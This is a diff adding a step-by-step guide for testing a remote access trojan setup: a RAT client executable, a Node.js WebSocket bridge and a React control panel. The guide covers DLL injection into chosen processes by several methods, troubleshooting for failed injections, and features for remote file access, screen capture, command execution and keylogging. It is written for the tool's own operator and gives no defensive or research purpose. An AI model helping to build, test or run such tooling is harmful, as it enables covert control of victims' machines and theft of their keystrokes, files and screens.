@@ -1,0 +1,179 @@
+# TESTING PROCESS INJECTION FROM UI - STEP BY STEP
+
+## PREREQUISITES:
+1. ✅ RAT client compiled: `rat_client_enhanced.exe`
+2. ✅ Bridge server ready: `bridge/index.js`
+3. ✅ Frontend running: React/Vite app
+
+## STEP 1: START ALL SERVICES
+
+### 1.1 Start Bridge Server (Node.js):
+```powershell
+cd "C:\Users\Administrator\Desktop\CLI C+ Root"
+node bridge/index.js
+```
+**Expected output:** "WebSocket server started on port 8080"
+
+### 1.2 Start RAT Client:
+```powershell
+cd "C:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+.\rat_client_enhanced.exe
+```
+**Expected output:** "Connected to server" or similar
+
+### 1.3 Start Frontend (React):
+```powershell
+cd "C:\Users\Administrator\Desktop\CLI C+ Root\Client\frontend"
+npm run dev
+```
+**Expected output:** "Local: http://localhost:5173" (or similar port)
+
+## STEP 2: ACCESS THE UI
+
+1. Open browser: http://localhost:5173
+2. Navigate to: **Process Injection** page
+   - Look for "Process Injection" in sidebar
+   - Or go to: http://localhost:5173/injection
+
+## STEP 3: TEST PROCESS ENUMERATION
+
+### 3.1 Get Process List:
+1. In UI, click "Refresh Process List" or similar button
+2. Should see list of running processes with:
+   - PID
+   - Process Name
+   - Architecture (x86/x64)
+   - User
+   - Memory Usage
+
+### 3.2 Test Process Injection:
+1. Select a target process from the list
+2. Choose injection method:
+   - **CreateRemoteThread** (standard)
+   - **QueueUserAPC** (alternative)
+   - **SetWindowsHookEx** (GUI processes)
+3. Select DLL to inject (test_dll.dll or custom)
+4. Click "Inject" button
+
+## STEP 4: VERIFY INJECTION
+
+### 4.1 Check Injection Status:
+- UI should show "Injection successful" or error message
+- Check bridge server logs for WebSocket messages
+- RAT client should show "DLL injected into PID: XXXX"
+
+### 4.2 Test DLL Functionality:
+If using `test_dll.dll`, it should:
+1. Create a message box: "DLL Injected Successfully!"
+2. Write to log file: `C:\temp\injection.log`
+3. Or perform custom payload
+
+## STEP 5: TROUBLESHOOTING
+
+### 5.1 If No Processes Show:
+- Check RAT client is running
+- Check WebSocket connection (bridge logs)
+- Verify `process_utils.cpp` compiled correctly
+
+### 5.2 If Injection Fails:
+- **32-bit vs 64-bit mismatch**: Can't inject x64 DLL into x86 process or vice versa
+- **Permission issues**: Run as Administrator
+- **Process protected**: Some system processes can't be injected
+- **DLL not found**: Ensure DLL path is correct
+
+### 5.3 Common Errors:
+- **"Access denied"**: Run RAT as Administrator
+- **"DLL not found"**: Use absolute path to DLL
+- **"Invalid process"**: Process may have terminated
+
+## STEP 6: TEST SPECIFIC FEATURES
+
+### 6.1 File Browser:
+- Navigate to "Files" page
+- Browse directories
+- Upload/download files
+- Create/delete folders
+
+### 6.2 Screen Capture:
+- Navigate to "Screenshots" page
+- Click "Capture Screen"
+- View captured images
+
+### 6.3 Command Execution:
+- Navigate to "Command" or "Terminal" page
+- Enter command: `whoami`
+- Should see current user
+
+### 6.4 Keylogger:
+- Navigate to "Keylogger" page
+- Start/stop keylogging
+- View captured keystrokes
+
+## STEP 7: MONITOR LOGS
+
+### 7.1 Bridge Server Logs:
+```powershell
+# In bridge server terminal, watch for:
+- "Client connected"
+- "Process list requested"
+- "Injection command received"
+- "DLL injection result"
+```
+
+### 7.2 RAT Client Logs:
+```powershell
+# In RAT client terminal, watch for:
+- "Received process list request"
+- "Attempting injection into PID: XXXX"
+- "DLL loaded successfully"
+- "Injection completed"
+```
+
+### 7.3 Browser Console (F12):
+- Open Developer Tools (F12)
+- Check Console tab for WebSocket messages
+- Check Network tab for API calls
+
+## QUICK TEST SCRIPT:
+
+Create `test_injection.js`:
+```javascript
+const WebSocket = require('ws');
+const ws = new WebSocket('ws://localhost:8080');
+
+ws.on('open', () => {
+    console.log('Connected to bridge');
+    
+    // Request process list
+    ws.send(JSON.stringify({
+        type: 'get_processes'
+    }));
+});
+
+ws.on('message', (data) => {
+    console.log('Received:', data.toString());
+});
+```
+
+Run: `node test_injection.js`
+
+## EXPECTED FLOW:
+
+1. **UI** → **Bridge** (WebSocket): "get processes"
+2. **Bridge** → **RAT Client** (TCP): "list processes"
+3. **RAT Client** → **Bridge**: Process list JSON
+4. **Bridge** → **UI**: Process list displayed
+5. **UI** → **Bridge**: "inject into PID 1234"
+6. **Bridge** → **RAT Client**: Injection command
+7. **RAT Client**: Performs injection
+8. **RAT Client** → **Bridge**: Injection result
+9. **Bridge** → **UI**: Success/failure message
+
+## READY TO START?
+
+Run these 3 commands in separate terminals:
+1. `node bridge/index.js`
+2. `.\rat_client_enhanced.exe`
+3. `npm run dev` (in Client/frontend)
+
+Then open: http://localhost:5173
